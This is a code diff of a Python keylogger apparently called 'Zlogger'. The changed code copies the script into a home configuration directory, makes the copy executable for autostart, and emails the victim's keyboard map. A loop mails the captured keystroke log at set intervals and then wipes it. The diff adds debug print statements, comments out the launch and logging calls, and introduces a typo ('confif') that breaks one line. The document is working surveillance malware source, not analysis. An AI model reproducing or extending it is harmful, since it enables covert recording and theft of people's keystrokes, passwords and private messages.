@@ -53,9 +53,6 @@ def initialize():
 	except OSError:
 	    pass
 	
-	current_file = os.path.realpath(__file__).replace(".py", "")
-	
-	destination_file = HOME_CONFIG_DIRECTORY + config.FILE_NAME
 	copyfile(current_file, destination_file)
 	chmod_to_exec(destination_file)
 
@@ -67,18 +64,27 @@ def initialize():
 	#Get Keyboard map and send it
 	kmap = check_output("xmodmap -pke", shell=True)
 	send_mail("Zlogger Character Map",kmap)
-	Popen(destination_file)
 
 def send_mail_reports_every(interval):
 	while True:
 		sleep(interval)
-		send_mail("Zlogger Report", file(LOG_FILE).read())
+		send_mail("Zlogger report", file(LOG_FILE).read())
 		with open(LOG_FILE, "w"):
 			pass
 
 
+current_file = os.path.realpath(__file__).replace(".py", "")
+destination_file = HOME_CONFIG_DIRECTORY + confif.file_name
+
+print("Current file <" + current_file + ">")
+print("destination file <" + destination_file + ">")
+print("comr config directory <" + HOME_CONFIG_DIRECTORY + ">")
+
 if not os.path.isfile(AUTOSTART_FILE) :
+	print("going to initialize")
 	initialize()
+	# Popen(destination_file)
 else:
-	start_logging(LOG_FILE)
-	send_mail_reports_every(config.SLEEP_INTERVAL)
+	print("[+] Normal work")
+	# start_logging(LOG_FILE)
+	# send_mail_reports_every(config.SLEEP_INTERVAL)
